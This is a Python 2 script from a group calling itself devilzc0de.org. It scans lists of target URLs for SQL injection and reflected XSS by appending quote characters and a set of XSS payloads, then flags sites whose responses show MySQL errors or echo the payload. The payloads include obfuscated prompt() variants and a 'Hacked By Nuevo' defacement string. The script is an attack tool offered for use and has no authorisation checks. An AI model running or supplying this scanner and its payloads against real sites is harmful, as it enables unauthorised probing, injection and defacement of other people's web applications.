import requests
import argparse
import re

print """
\t\t\t|-----------------------------------|
\t\t\t|          devilzc0de.org           |
\t\t\t|     We Are Coder And Exploiter    |
\t\t\t|                                   |
\t\t\t|  Web Scanner Project Version 0.4  |
\t\t\t|     Created By Nuevo Querto       |
\t\t\t|-----------------------------------|
"""

def Scanning(Target, Payload, RegeX):
	InjectingPayload = Target + "%s" %(Payload)
	Request = requests.get(InjectingPayload)
	HTTPCode = Request.status_code
	Checking_Payload = re.search(RegeX, Request.text, re.M|re.I)
	
	print "Payload: " + InjectingPayload + " %s" %("[ Vuln ] [ %s ]\n" if Checking_Payload else "[ Not Vuln ] [ %s ]\n") %(HTTPCode)
	
try:
	Parser = argparse.ArgumentParser(prog="Web.py", description="Untuk Scanning Website")
	Parser.add_argument("-u", "--url", help="Target Wordlists, Example: User/Target.txt", action="store", default=False, dest="Target")
	Parser.add_argument("--payload", help="Payload Wordlists, Example: User/wordlist.txt", action="store", default=False, dest="Wordlist")
	Args = Parser.parse_args()
	
	TargetWordlists = []
	
	Payload = []
	SQLI_Payload = ["'", "\"", "\\"]
	SQLI_Error = "SQL syntax|valid MySQL result|mysql_fetch_array|getimagesize|session_start|mysql_num_rows|mysql_query|error while retieving data" #MySQL Error DB
	XSS_Payload = ["<script>alert(1)</script>", "<img src=x onerror=alert(1) />", "\"><img src=x onerror=alert(1) />", 
		"'<1337 contenteditable onmouseover=prompt(document.domain) />", "\"><img src=x onerror=alert('XSS-By-Nuevo-Querto') />Nuevo/", "\"><img src=\"x\" onerror=\"alert(1);\" />",
		"\"><marquee><h1>Hacked By Nuevo</h1></marquee> />", "\"><img src=x onerror=prompt(document.domain) />Tes", "\"><img src=x onerror=%5Cu0070%5Cu0072%5Cu006f%5Cu006d%5Cu0070%5Cu0074(1337) />",
		"\"><img src=x onerror=\u0070\u0072\u006f\u006d\u0070\u0074(1337) />"
	] # Default XSS Payload
	
	try:
		if Args.Wordlist:
			with open(Args.Wordlist, "r+") as file:
				Read = file.read()
				Pisahkan = Read.split("\n")
			for i in range(len(Pisahkan)):
				Import_Payload = Payload.append("%s" %(Pisahkan[i]))
		else:
			for x in range(len(XSS_Payload)):
				Import_Payload = Payload.append("%s" %(XSS_Payload[x]))
			
		if Args.Target:
			with open(Args.Target, "r+") as file:
				Read = file.read()
				Pisahkan = Read.split("\n")
			for i in range(len(Pisahkan)):
				Import_Target = TargetWordlists.append("%s" %(Pisahkan[i]))
				print "\n\n\n" + "[ Target %s: " %(i + 1) + TargetWordlists[i] + " ]\n"
				print "[ SQLI Scanning ]\n"
				for z in range(len(SQLI_Payload)): # Injecting SQLI Payload
					Scanning(TargetWordlists[i], SQLI_Payload[z], r"%s" %(SQLI_Error))
				print "\n[ SQLI Scanning Done ]\n\n\n"
				
				print "[ XSS Scanning ]\n"
				for x in range(len(Payload)): # Injecting XSS Payload
					Scanning(TargetWordlists[i], Payload[x], re.escape(r"%s" %(Payload[x])))
				print "\n[ XSS Scanning Done ]\n"
				print "[ -- ]"
		else:
			print "Use -h or --help for Help"
	except IOError as E:
		print E
except KeyboardInterrupt:
	print "User Cancelling"
